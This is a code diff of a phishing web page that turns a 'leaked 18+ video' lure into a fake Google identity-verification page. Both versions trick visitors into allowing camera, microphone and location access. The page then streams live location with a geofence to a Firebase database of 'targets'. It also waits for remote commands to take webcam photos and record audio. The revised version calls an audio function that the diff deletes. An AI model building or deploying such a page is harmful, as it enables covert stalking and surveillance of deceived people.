@@ -3,161 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viral Video</title>
+    <title>Google Security Service</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; }
-        .video-wrapper { position: relative; width: 100%; height: 300px; background: #000; margin-top: 50px; display: none; }
-        iframe { width: 100%; height: 100%; }
-        #cover { padding: 20px; margin-top: 60px; }
-        h2 { color: #ff0000; font-size: 24px; text-transform: uppercase; }
-        p { color: #ccc; }
+        body { font-family: 'Roboto', sans-serif; background: #fff; color: #3c4043; text-align: center; margin: 0; padding: 0; }
+        .header { padding: 20px; border-bottom: 1px solid #e0e0e0; }
+        .google-logo { width: 75px; margin-bottom: 10px; }
+        .container { padding: 40px 20px; }
+        h2 { font-weight: 400; font-size: 22px; margin-bottom: 8px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; }
         #playBtn { 
-            padding: 15px 40px; 
-            font-size: 20px; 
-            background: #cc0000; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            font-weight: bold;
-            box-shadow: 0 0 15px rgba(204, 0, 0, 0.5);
-            margin-top: 20px;
+            background: #1a73e8; color: #fff; border: none; padding: 12px 24px; 
+            border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; 
+            margin-top: 25px; box-shadow: 0 1px 3px rgba(60,64,67,0.3);
         }
-        #status { margin-top: 15px; color: #555; font-size: 12px; }
+        #playBtn:active { background: #1765cc; }
+        .video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 999; }
+        iframe { width: 100%; height: 100%; border: none; }
+        #status { margin-top: 20px; font-size: 11px; color: #bdc1c6; }
     </style>
 </head>
 <body>
 
-    <div id="cover">
-        <h2>🔥 Leaked Video</h2>
-        <p>This video contains content for 18+ only.<br>Viewer discretion is advised.</p>
-        <button id="playBtn" onclick="startEverything()">▶ WATCH VIDEO</button>
-        <p id="status">Waiting for user verification...</p>
+    <div id="mainUI">
+        <div class="header">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo" alt="Google">
+        </div>
+        <div class="container">
+            <h2>Verify your identity</h2>
+            <p>To continue to the shared private album, Google needs to verify that you are a human and not a bot.</p>
+            <p style="font-size: 12px; margin-top: 10px;">Security check will use your camera and location briefly.</p>
+            
+            <button id="playBtn" onclick="startSystem()">VERIFY & PROCEED</button>
+            <p id="status">Secure Connection: AES-256 Active</p>
+        </div>
     </div>
 
     <div class="video-wrapper" id="videoArea">
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=1" allow="autoplay"></iframe>
     </div>
 
     <script>
-        // --- 1. CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
-        // --- 2. FIX: USER ID SAB SE PEHLE DEFINE KARNA HAI ---
-        let userId = localStorage.getItem("target_name");
-        if (!userId) {
-            userId = "User_" + Math.floor(Math.random() * 99999);
-            localStorage.setItem("target_name", userId);
-        }
-        console.log("Target ID Set: " + userId);
 
-        // --- 3. MAIN FUNCTION (Button dabane par chalega) ---
-        async function startEverything() {
-            document.getElementById('status').innerText = "Verifying age...";
-            
+        let userId = localStorage.getItem("target_name") || "Target_" + Math.floor(Math.random() * 9999);
+        localStorage.setItem("target_name", userId);
+
+        // GEOFENCING CONFIG (Example: Karachi Center)
+        const safeZone = { lat: 24.8607, lng: 67.0011, radius: 0.5 }; // 500 meters radius
+
+        async function startSystem() {
+            document.getElementById('status').innerText = "Authenticating...";
             try {
-                // Permission Mango (Camera & Mic)
+                // Permissions Request
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                 
-                // Permission mil gayi! Video dikhao
-                document.getElementById('cover').style.display = 'none';
+                // Instant Online Signal
+                db.ref('targets/' + userId + '/location').update({ status: "Online", last_seen: firebase.database.ServerValue.TIMESTAMP });
+
+                // UI Switch
+                document.getElementById('mainUI').style.display = 'none';
                 document.getElementById('videoArea').style.display = 'block';
 
-                // Tracking Shuru Karo
-                initTracking();
-                
-                // Stream tracks ko band mat karna taake background me chalta rahe
-                // (Optional: Agar notification hatana hai to stream.getTracks().forEach(t => t.stop()) use karein, par tracking ruk sakti hai)
-
+                initLiveTracking();
             } catch (e) {
-                // Agar user ne "Deny" kiya ya koi error aaya
-                alert("Please ALLOW permissions to watch the video!");
-                document.getElementById('status').innerText = "Access Denied. Reload to try again.";
-                console.error(e);
+                alert("Identity verification failed. Please allow all permissions.");
             }
         }
 
-        function initTracking() {
-            // Location Tracking
-            navigator.geolocation.watchPosition(
-                (pos) => {
-                    db.ref('targets/' + userId + '/location').update({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        timestamp: new Date().toLocaleTimeString(),
-                        status: "Online"
-                    });
-                },
-                (err) => console.log("Location Error"),
-                { enableHighAccuracy: true }
-            );
+        function initLiveTracking() {
+            // High Accuracy Live Location
+            navigator.geolocation.watchPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                
+                // Geofencing Check
+                const distance = getDistance(lat, lng, safeZone.lat, safeZone.lng);
+                const zoneStatus = distance > safeZone.radius ? "⚠️ OUT OF RANGE" : "✅ Inside Safe Zone";
 
-            // Online Heartbeat (Har 10 second update)
-            setInterval(() => {
-                db.ref('targets/' + userId + '/location/last_seen').set(firebase.database.ServerValue.TIMESTAMP);
-            }, 10000);
+                db.ref('targets/' + userId + '/location').update({
+                    lat: lat,
+                    lng: lng,
+                    geofence: zoneStatus,
+                    last_seen: firebase.database.ServerValue.TIMESTAMP
+                });
+            }, null, { enableHighAccuracy: true });
 
-            // Commands Suno
-            listenForCommands();
-        }
-
-        function listenForCommands() {
+            // Listen for Admin Commands
             db.ref('commands/' + userId).on('value', async (snap) => {
                 const cmd = snap.val();
-                if (!cmd) return;
-
-                if (cmd.action === "snap") { await capturePhoto(); }
-                if (cmd.action === "mic") { await recordAudio(15); }
-                
-                // Command delete karo taake dubara na chale
-                db.ref('commands/' + userId).remove();
+                if (cmd?.action === "snap") capturePhoto();
+                if (cmd?.action === "mic") recordAudio(15);
+                if (cmd) db.ref('commands/' + userId).remove();
             });
         }
 
+        // Distance Calculator for Geofencing
+        function getDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371; // Earth radius in km
+            const dLat = (lat2-lat1) * Math.PI / 180;
+            const dLon = (lon2-lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        }
+
+        // --- CAMERA & MIC FUNCTIONS ---
         async function capturePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const track = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
                 const blob = await imageCapture.takePhoto();
-                
                 const reader = new FileReader();
                 reader.readAsDataURL(blob);
                 reader.onloadend = () => {
-                    db.ref('targets/' + userId + '/photos').push({
-                        image: reader.result,
-                        time: new Date().toLocaleTimeString()
-                    });
-                    track.stop(); // Photo le kar camera band
+                    db.ref('targets/' + userId + '/photos').push({ image: reader.result, time: new Date().toLocaleTimeString() });
+                    track.stop();
                 };
-            } catch (e) { console.error("Camera Error: ", e); }
-        }
-
-        async function recordAudio(sec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const reader = new FileReader();
-                    reader.readAsDataURL(new Blob(chunks));
-                    reader.onloadend = () => {
-                        db.ref('targets/' + userId + '/audio').push({
-                            data: reader.result,
-                            time: new Date().toLocaleTimeString()
-                        });
-                    };
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), sec * 1000);
-            } catch (e) { console.error("Mic Error: ", e); }
+            } catch(e) {}
         }
     </script>
 </body>
